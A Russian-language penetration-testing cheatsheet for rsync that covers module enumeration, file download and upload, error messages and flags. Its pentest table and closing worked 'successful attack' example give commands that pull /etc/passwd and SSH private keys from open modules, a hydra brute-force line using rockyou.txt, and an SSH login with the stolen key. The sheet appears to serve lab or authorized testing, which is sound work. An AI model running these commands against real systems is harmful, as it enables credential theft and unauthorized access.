# Rsync — Cheatsheet (пентест)

## Что это
Rsync — утилита для синхронизации файлов и директорий через сеть (похожа на scp, но мощнее). Часто используется для бэкапов. Может быть настроен без пароля (анонимный доступ).


## Подключение

### Формат URI
```
rsync://<HOST>[:PORT]/<MODULE>
```

### Список модулей
```bash
rsync rsync://<HOST>
```

### Посмотреть содержимое модуля
```bash
rsync --list-only rsync://<HOST>/<MODULE>
rsync -av --list-only rsync://<HOST>/<MODULE>/
```

---

## Скачивание (чтение)

### Скачать всё содержимое модуля
```bash
rsync -av rsync://<HOST>/<MODULE>/ ./local_folder/
```

### Скачать конкретный файл
```bash
rsync -av rsync://<HOST>/<MODULE>/path/to/file ./file
```

### Скачать с сохранением структуры
```bash
rsync -av --relative rsync://<HOST>/<MODULE>/path/ ./backup/
```

---

## Загрузка (запись) — если разрешено

### Загрузить файл
```bash
rsync -av local_file rsync://<HOST>/<MODULE>/remote_file
```

### Загрузить папку
```bash
rsync -av ./local_folder/ rsync://<HOST>/<MODULE>/remote_folder/
```

---

## Диагностика

### Проверить, можно ли писать (тест)
```bash
echo "test" > test.txt
rsync -av test.txt rsync://<HOST>/<MODULE>/test.txt
```
Если требует пароль или ошибка — запись запрещена.

### Показать детали соединения
```bash
rsync -av --verbose rsync://<HOST>/<MODULE>/
```

---

## Использование в пентесте

| Задача | Команда |
|--------|---------|
| Найти открытые модули | `rsync rsync://<HOST>` |
| Найти файлы конфигурации | `rsync -av --list-only rsync://<HOST>/<MODULE>/ \| grep -E "passwd\|shadow\|config\|\.env"` |
| Скачать SSH-ключи | `rsync -av rsync://<HOST>/<MODULE>/home/*/.ssh/id_rsa ./` |
| Скачать /etc/passwd | `rsync -av rsync://<HOST>/<MODULE>/etc/passwd ./passwd` |
| Скачать всё | `rsync -av rsync://<HOST>/<MODULE>/ ./full_backup/` |

---

## Ошибки

| Ошибка | Значение |
|--------|----------|
| `@ERROR: auth failed on module` | Требуется пароль (или модуль защищён) |
| `@ERROR: Unknown module` | Модуль не существует |
| `rsync: connection unexpectedly closed` | Нет прав или сервер не отвечает |
| `Permission denied` | Нет прав на запись или чтение |

---

## Полезные ключи

| Ключ | Назначение |
|------|------------|
| `-a` | Архивный режим (сохраняет права, симлинки) |
| `-v` | Подробный вывод |
| `-r` | Рекурсивно |
| `-z` | Сжатие при передаче |
| `--list-only` | Только показать файлы (без скачивания) |
| `--no-motd` | Убрать приветственное сообщение |
| `--delete` | Удалить файлы в цели, которых нет в источнике (осторожно!) |

---

## Брутфорс пароля (если модуль защищён)

```bash
hydra -l "" -P /usr/share/wordlists/rockyou.txt rsync://<HOST>/<MODULE>
```

Или перебирать модули, если имя неизвестно:

```bash
for module in files backup www data public share; do
    rsync -av --list-only rsync://<HOST>/$module/
done
```

---

## Пример успешной атаки

```bash
# 1. Найти модули
rsync rsync://10.49.138.229
# > files

# 2. Посмотреть содержимое
rsync -av --list-only rsync://10.49.138.229/files/

# 3. Скачать всё (если нет пароля)
rsync -av rsync://10.49.138.229/files/ ./downloaded/

# 4. Искать SSH-ключи
grep -r "BEGIN.*PRIVATE KEY" ./downloaded/

# 5. Подключиться по SSH
ssh -i ./downloaded/home/user/.ssh/id_rsa user@10.49.138.229